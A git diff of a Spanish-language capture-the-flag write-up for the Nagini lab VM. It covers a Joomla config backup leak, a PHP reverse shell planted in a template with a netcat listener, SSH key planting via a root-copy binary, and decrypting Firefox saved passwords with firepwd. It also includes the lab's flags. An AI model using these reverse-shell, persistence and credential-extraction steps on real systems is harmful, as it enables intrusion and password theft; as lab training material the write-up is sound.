@@ -19,14 +19,10 @@
   - [Curl]()
   - [Web]()
 - [Búsqueda de vulnerabilidades](#búsqueda-de-vulnerabilidades)
-  - [SSRF]()
-- [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades)
   - [Gopherus]()
+- [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades)
   - [Joomla]()
 - [Post-explotación](#post-explotación)
-  - [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades-1)
-    - [Reverse Shell]()
-  - [Recopilación de información](#recopilación-de-información-1)
   - [Movimiento Lateral]()
   - [Búsqueda de vulnerabilidades](#búsqueda-de-vulnerabilidades-1)
        - [linPEAS]()
@@ -114,9 +110,11 @@ Entramos en la página web que hemos recopilado anteriormente y probando hemos c
 
 Además también recopilamos que podria haber un archivo .bak, así que como sabemos que joomla tiene un **configuration.php** probaremos ese archivo pero con el **.bak**
 
+<img src="https://i.gyazo.com/80332244cc29f88dc54c8131320895e8.png">
+
 En este archivo hemos encontrado que un usuario es **goblin** y el correo **site_admin@nagini.hogwarts**
 
-## Explotación de vulnerabilidades
+## Búsqueda de vulnerabilidades
 
 ### Gopherus
 
@@ -179,6 +177,8 @@ Lo que vamos hacer ahora es modificar la contraseña del usuario con el correo q
 
 > Se veria de esta forma el uso de esta tool
 
+## Explotación de vulnerabilidades
+
 ### Joomla
 
 Iremos a esta dirección para modificar un index.php como una [reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php):
@@ -187,4 +187,88 @@ Iremos a esta dirección para modificar un index.php como una [reverse shell](ht
 
 Ahora explotaremos la vulnerabilidad poniendo un puerto abierto ```rlwrap nc -nvlp 4444``` y abriendo la reverse shell desde esta url:
 ```http://192.168.221.8/joomla/templates/protostar/index.php```
+
+Para tener un shell interactiva usaremos este comando:
+
+```python3 -c 'import pty; pty.spawn("/bin/bash")'```
+
+## Post-explotación
+
+## Movimiento Lateral
+
+Iremos a la home del usuario snape y usaremos un comando para enumerar lo que hay: ```ls -a```
+
+Encontramos un archivo oculto llamado **.creds.txt** donde esta la contraseña hasheada: Love@lilly
+
+Con esto nos conectaremos al usuario snape: ```su snape```
+
+Dentro del usuario hermoine hemos visto una carpeta **.ssh** y dentro de **/bin/** un archivo llamado **su_cp**
+
+Este archivo lo que hace es copiar un archivo como root
+
+Después de ello en nuestra máquina crearemos un **id_rsa** con el comando ```ssh-keygen```
+
+Copiaremos la clave pública y crearemos el archivo:
+```echo "SSH PUBLICA" > authorized_keys```
+
+Darle permisos con este comando: ```chmod 0644 authorized_keys```
+
+Después de esto haremos este comando para copiarlo en la carpeta .ssh:
+```./su_cp -p /tmp/authorized_keys /home/hermoine/.ssh/```
+
+> El -p es para cuando copies el archivo no se pierdan los permisos dados anteriormente
+
+Gracias a esto nos conectaremos la ssh privada en local:
+```ssh hermoine@192.168.221.8 -i id_rsa```
+
+Aquí la primera flag: **horcrux_{NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=}**
+
+## Búsqueda de vulnerabilidades
+
+### linPEAS
+
+Lo primero es tirar el [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) para ver que encuentra
+
+Hemos visto que hay un carpeta en el usuario de hermoine llamada **/.mozilla/firefox/g2mhbq0o.default**
+
+En esta carpeta tenemos archivos interesantes como **key4.db** o **login.json**
+
+## Explotación de vulnerabilidades
+
+### Mozilla decrypt
+
+Al buscar información de como hacerle decrypt a las contraseñas de mozilla he encontrado esta [página web](https://github.com/lclevy/firepwd)
+
+Lo descargamos y le damos permisos de ejecución, después de esto lo ejecutaremos teniendo el archivo **key4.db** en la misma carpeta:
+```python3 firepwd.py```
+
+<img src="https://i.gyazo.com/f6394e679f7a3602c1e79f19a99a2792.png">
+
+Por último nos conectaremos como root y podremos obtener la flag de root.
+
+Aquí esta la Segunda Flag:
+
+```
+  ____                            _         _       _   _
+ / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___
+| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
+| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
+ \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
+                  |___/
+
+
+Machine Author: Mansoor R (@time4ster)
+Machine Difficulty: Medium
+Machine Name: Nagini
+Horcruxes Hidden in this VM: 3 horcruxes
+
+You have successfully pwned Nagini machine.
+Here is your third hocrux: horcrux_{NTogRGlhZGVtIG9mIFJhdmVuY2xhdyBkZXN0cm95ZWQgYnkgSGFycnk=}
+
+
+
+
+# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com
+
+```
 
